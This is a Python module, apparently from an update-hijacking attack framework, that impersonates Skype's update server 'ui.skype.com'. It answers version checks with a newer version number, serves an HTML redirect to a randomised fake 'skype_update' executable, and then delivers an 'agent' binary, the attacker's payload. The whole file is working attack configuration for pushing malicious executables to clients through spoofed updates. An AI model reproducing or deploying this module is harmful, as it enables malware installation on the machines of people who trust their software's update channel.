from modules import ModuleBase


class Skype(ModuleBase):
    name = 'Skype'
    version = '1.0'
    appver = ''
    author = ['Francisco Amato < famato +[AT]+ infobytesec.com >']
    description = ''
    vh = '(ui.skype.com)'
    options = {
        'rnd1': {
            'val': 'rand_num(5)',
            'hidden': 1,
            'dynamic': 1,
        }
    }
    requests = [
        {   'path': 'getnewestversion',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '4.5.0.615',
            'parse': 1,
            'file': '',
        },
        {   'path': 'download',
            'type': 'string',
            'method': '',
            'bin': 0,
            'string': '<html><script>window.location="http://ui.skype.com/skype_update_4.0.0<%RND1%>.exe"</script></html>',
            'parse': 1,
            'file': '',
        },
        {   'path': '.exe',
            'type': 'agent',
            'method': '',
            'bin': 1,
            'string': '',
            'parse': 0,
            'file': ''
        }
    ]

